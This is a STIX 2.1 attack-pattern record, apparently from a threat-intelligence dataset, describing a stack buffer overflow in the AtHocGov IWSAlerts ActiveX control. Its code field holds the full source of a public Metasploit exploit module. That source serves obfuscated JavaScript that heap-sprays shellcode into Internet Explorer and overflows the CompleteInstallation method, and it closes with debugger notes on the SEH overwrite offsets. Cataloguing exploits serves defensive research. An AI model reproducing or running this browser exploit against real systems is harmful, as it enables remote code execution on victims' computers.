{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c614eb79-0578-4f6d-b5a8-c9452ec043d4",
    "created": "2024-08-14T16:40:09.768128Z",
    "modified": "2024-08-14T16:40:09.768133Z",
    "name": "AtHocGov IWSAlerts ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in AtHocGov IWSAlerts. When sending an overly long string to the CompleteInstallation() method of AtHocGovTBr.dll (6.1.4.36) an attacker may be able to execute arbitrary code. This vulnerability was silently patched by the vendor.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/athocgov_completeinstallation.rb",
            "external_id": "athocgov_completeinstallation.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AtHocGov IWSAlerts ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in AtHocGov IWSAlerts. When\n        sending an overly long string to the CompleteInstallation() method of AtHocGovTBr.dll\n        (6.1.4.36) an attacker may be able to execute arbitrary code. This\n        vulnerability was silently patched by the vendor.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'OSVDB', '94557' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => '' } ]\n        ],\n      'DisclosureDate' => '2008-02-15',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ])\n      ])\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    ret = Rex::Text.uri_encode(Metasm::Shellcode.assemble(Metasm::Ia32.new, \"or cl,[edx]\").encode_string * 2)\n\n    js = %Q|\n      try {\n        var evil_string = \"\";\n        var index;\n        var vulnerable = new ActiveXObject('AtHocGovGSTlBar.GSHelper.1');\n        var my_unescape = unescape;\n        var shellcode = '#{shellcode}';\n        #{js_heap_spray}\n        sprayHeap(my_unescape(shellcode), 0x0a0a0a0a, 0x40000);\n        for (index = 0; index < 12500; index++) {\n          evil_string = evil_string + my_unescape('#{ret}');\n        }\n        vulnerable.CompleteInstallation(evil_string);\n      } catch( e ) { window.location = 'about:blank' ; }\n    |\n\n    opts = {\n      'Strings' => true,\n      'Symbols' => {\n        'Variables' => [\n          'vulnerable',\n          'shellcode',\n          'my_unescape',\n          'index',\n          'evil_string',\n        ]\n      }\n    }\n    js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)\n    js.update_opts(js_heap_spray.opts)\n    js.obfuscate(memory_sensitive: true)\n    content = %Q|\n      <html>\n      <body>\n        <script><!--\n        #{js}\n        //</script>\n      </body>\n      </html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\n\nend\n=begin\nIDL info...\n  [id(0x00000022)]\n  HRESULT CompleteInstallation([in] BSTR strParam);\n\n$~/trunk/./msfpescan -f AtHocGovTBr.dll\nAtHocGovTBr.dll: Microsoft Visual C++ v7.1 EXE [165]\nAtHocGovTBr.dll: Microsoft Visual C++ v7.1 DLL [159]\n\n// smash /GS\n$~/trunk/./msfpescan -i AtHocGovTBr.dll | grep SecurityCookie\n SecurityCookie                 0x4278193c\n\n// /SafeSEH, not today.\n$~/trunk/./msfpescan -i AtHocGovTBr.dll | grep SEH\n SEHandlerTable                 0x42774e40\n SEHandlerCount                 0x0000021b\n\n0:000> !exchain\n0013cae0: ntdll!_except_handler3+0 (7c90ee18)\n  CRT scope  0, filter: ntdll!RtlFreeHeap+613 (7c93bec5)\n                func:   ntdll!RtlFreeHeap+617 (7c93bece)\n0013cb1c: AtHocGovTBr!SetOfflineInstall+a0b4 (4274f944)\n0013dd9c: 61473161\nInvalid exception stack at 47306147\n0:000> !pattern_offset 5140 0x47306147\n[Byakugan] Control of 0x47306147 at offset 4680.\n0:000> !pattern_offset 5140 0x61473161\n[Byakugan] Control of 0x61473161 at offset 4684.\n=end\n",
    "x_mitre_disclosure_date": "2008-02-15",
    "x_mitre_platforms": [
        "win'"
    ]
}